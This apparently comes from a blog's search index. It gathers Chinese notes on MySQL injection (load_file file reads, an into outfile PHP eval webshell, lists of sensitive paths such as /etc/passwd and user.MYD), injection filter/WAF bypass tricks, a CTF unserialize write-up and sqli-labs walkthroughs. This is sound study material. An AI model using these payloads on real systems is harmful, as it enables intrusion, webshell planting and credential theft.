@@ -1,6 +1,270 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Mysql注入中load_file()与select into outfile命令</title>
+    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
+<span id="more"></span>
+
+<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
+<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
+<p>我们构造**$id**为：</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
+<p>我们的查询语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
+<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
+<p>所以上面的语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
+<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
+<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
+<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
+<p>2、能够使用union （需要mysql 3以上的版本）</p>
+<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
+<p>后天条件需要二个：</p>
+<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
+<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
+<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
+<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
+<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
+<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
+<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
+<p>而无法查看到代码。</p>
+<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
+<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
+<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
+<p>apache文件。</p>
+<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
+<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
+<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
+<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
+<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
+<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
+<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
+<p>14、/etc/my.cnf Mysql的配置文件</p>
+<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
+<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
+<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
+<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
+<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
+<p><strong>其中，into outfile的使用前提是：</strong></p>
+<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
+<p>2.要有file权限，默认情况下只有root权限有</p>
+<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
+<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
+<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
+<p>1.直接写进文件里</p>
+<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
+<p>2.修改文件结尾</p>
+<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
+<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
+<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
+<p>查版本号</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
+    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
+<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
+<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
+<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入bypass</title>
+    <url>/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/</url>
+    <content><![CDATA[<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>[<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]</a>(<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧</a> 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目)</p>
+<p><a href="https://blog.csdn.net/Likhaooo/article/details/122746954">https://blog.csdn.net/Likhaooo/article/details/122746954</a></p>
+<p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a></p>
+<span id="more"></span>
+
+<h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1.双写绕过"></a>1.双写绕过</h3><p>如：union————uunionnion</p>
+<h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h3><p>如：union————uNion</p>
+<h3 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904168441-e45d6618-2256-45c6-964d-9947b331e399.png" alt="img"></p>
+<p>/**/</p>
+<p>两个空格代替一个空格，用 Tab 代替空格，%a0=空格</p>
+<p>%20 %09 %0a %0b %0c %0d %a0 </p>
+<p>%09 TAB 键（水平）</p>
+<p>%0a 新建一行</p>
+<p>%0c 新的一页</p>
+<p>%0d return 功能</p>
+<p>%0b TAB 键（垂直）</p>
+<p>%a0 空格</p>
+<p>`` 反引号绕过空格 payload：select * from <code>users</code> where user_id=1 limit 0,1;</p>
+<p>()   括号绕过空格</p>
+<h3 id="4-等号绕过"><a href="#4-等号绕过" class="headerlink" title="4.等号绕过"></a>4.等号绕过</h3><p>like代替=</p>
+<p>&lt;&gt;等价于!=所以我们可以在&lt;&gt;前加个!就变成等于了。</p>
+<p>例如:id=-1’ union select * from users where ! (id&lt;&gt;2)%23</p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835713783-67483261-f53f-4b24-b0ef-d5f06dcbe2c8.png" alt="img"></p>
+<h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字：</p>
+<p>%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+<p>%df  %de %e0 %e1等字符可以与%5c（’&#39;）结合成为一个字符</p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835895484-1baff8b5-acd7-4fa8-9e3e-8db4747171ad.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904257358-2d8b9a5d-ac71-4166-9135-910dc22223b5.png" alt="img"></p>
+<h3 id="安全狗绕过测试"><a href="#安全狗绕过测试" class="headerlink" title="安全狗绕过测试"></a>安全狗绕过测试</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905525941-6132af97-256e-4ac2-b0d0-babb9a5a02ce.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905052047-8f2b1c70-325a-48fe-862e-606f13468785.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905204938-08064d9a-ed11-46b4-ac0b-8c4754cebff7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905348334-c2fd2c55-5508-4ca8-a2ed-5fc405637de7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905381143-bac0ab1c-e501-4c60-a394-5640cc15971c.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905451016-7bd3b8b2-2b7f-46be-834b-3c2f35e51ea4.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(SWPUCTF 2021 新生赛)ez_unserialize</title>
+    <url>/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070605858-43f3f5c2-fbff-4677-90ac-0fe0d7781677.png" alt="img"></p>
+<span id="more"></span>
+
+<p>常规来看，找不到题目，找源码。</p>
+<p>源码不给提示。扫目录</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070663737-8aabd0ac-c2ed-4735-93b2-4c0f52442e27.png" alt="img"></p>
+<p>robots.txt里面有不能访问的文件名</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070709712-b23888e2-cc78-4328-9689-dd290d1caed2.png" alt="img"></p>
+<p>代码分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;                              //定义了一个wllm类</span><br><span class="line"></span><br><span class="line">    public $admin;                       //定义类属性admin</span><br><span class="line">    public $passwd;                      //定义类属性passwd</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;       //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;            //定义wllm类中的admin属性值为user</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;        //定义wllm类中的passwd属性值为123456</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;     //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;  //当admin=admin，passwd=ctf时输出flag</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;                            //反之，输出admin、passwd以及just a bit more</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];                           //用get方法接收参数p</span><br><span class="line">unserialize($p);                           //将参数p反序列化</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag</p>
+<p>所以构造序列化代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa=new wllm();             //aa为wllm的实例化对象</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;         //aa的admin属性值为admin</span><br><span class="line">$aa-&gt;passwd=&quot;ctf&quot;;          //aa的passwd属性值为ctf</span><br><span class="line">$s=serialize($aa);          //将aa序列化赋值给s</span><br><span class="line">print_r($s);                //输出s</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071554143-e61d21a7-14b5-4ab2-85e6-569c66349c5f.png" alt="img"></p>
+<p>payload</p>
+<p>?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071604351-3ab66640-83a3-47fa-865a-52fdc266fd8a.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqlilab靶场</title>
+    <url>/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049371192-6ee85b0d-6b59-4ea3-9107-3c429c0fe92c.png" alt="img"></p>
+<span id="more"></span>
+
+<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049620796-0c0add00-ddd5-45e2-8dcd-1c9641b53750.png" alt="img"></p>
+<p>?id=1’    报错  </p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049675284-2b4ea92c-e54a-4889-ab02-bdffea0de47d.png" alt="img"></p>
+<p>加了注释符之后不报错，说明是字符型注入</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049729086-d7787685-39b1-4dc9-8ff6-39723195a924.png" alt="img"></p>
+<p>order by 猜字段</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049789991-89b569c6-8529-425e-82dd-e0ca640ec250.png" alt="img"></p>
+<p>union select 爆出错误所在位置</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049861866-cc2d9ab8-3a5f-487f-9d30-f67157882aef.png" alt="img"></p>
+<p>查看数据库和版本信息</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049969075-8d212a9d-ad4f-479d-8cdf-45f94f024175.png" alt="img"></p>
+<p>爆表名</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050221439-05f64900-187c-4cf3-b513-a995209eeaf8.png" alt="img"></p>
+<p>爆列名</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050905009-87111a35-1ac5-4c9e-87fa-9a4cd7d466c0.png" alt="img"></p>
+<p>爆数据</p>
+<p>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
+<h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070233672-120a1495-bf5e-4bed-ae81-ee1eebb6ee0b.png" alt="img"></p>
+<p>id=1 and 1=1 不报错，可知整形注入</p>
+<p>其余步骤与第一关一样，不加’与注释符号</p>
+<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070788475-ba305d81-a326-4993-a092-268b2ae50601.png" alt="img"></p>
+<p>报错数字1的后面多了），可疑</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070854475-317596fe-0224-4f50-83a0-3a0bc4554087.png" alt="img"></p>
+<p>所以是‘）绕过</p>
+<p>后续步骤与第一关一样</p>
+<h3 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670071003645-fd581b22-0a46-44af-8fa4-7690181e23fc.png" alt="img"></p>
+<p>这都不报错，有点顽固</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073776067-f4c2622c-3701-4210-8a6b-f9ce6ff0995a.png" alt="img"></p>
+<p>看到一个），可疑</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073797643-e6506375-d53b-433d-9292-b8ae1ea98849.png" alt="img"></p>
+<p>其余步骤和第一关一样</p>
+<h3 id="对前四关总结"><a href="#对前四关总结" class="headerlink" title="对前四关总结"></a>对前四关总结</h3><p>前四关都是再id=1的基础上加一个或两个符号，可以根据报错来判断需要用什么符号来绕过。</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074546797-aba5906a-1ee3-4127-a7f2-b50a91da31ba.png" alt="img">以此为例，报错语句中   ‘’1’’)LIMIT0,1’     </p>
+<p>简要分析，除掉两端的单引号 则为 ‘1’’)LIMIT0,1 ，可以看出1的右边多了’)，我们输入的为?id=1’</p>
+<p>所以可以分解为   ‘1’    ‘)    LIMIT0,1    ,中间的‘是sql语句中本身就带着的，被我们前面加上的’给挤到后面了，所以sql中还多了一个），这一个）就是为了闭合（</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074970572-d6471fcf-929d-4986-9a7a-4eaf3d4a646b.png" alt="img"></p>
+<p>1为我们加的闭合字符，2为sql语句中的原有字符</p>
